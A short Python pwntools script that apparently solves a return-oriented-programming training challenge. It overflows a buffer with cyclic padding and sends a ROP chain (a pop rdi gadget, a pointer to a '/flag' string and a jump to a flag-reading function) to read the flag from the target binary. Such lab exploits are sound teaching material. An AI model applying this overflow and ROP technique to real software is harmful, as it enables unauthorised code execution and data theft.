#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")
sh = process("/challenge/return-oriented-programming-level1.0")
# sh = process("./return-oriented-programming-level1.0")

read_flag_addr = 0x40130C
buf_addr = 0
pop_rdi_addr = 0x401483


payload = cyclic(0x40)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp


line = sh.recv().decode().split('\n')[-2].split(' ')[-1]
buf_addr = int(line, 16)

payload += p64(pop_rdi_addr)
payload += p64(buf_addr+0x60)

payload += p64(read_flag_addr)
payload += b'/flag\0\0\0'


# sh.interactive()
sh.send_raw(payload)
print(sh.recv())
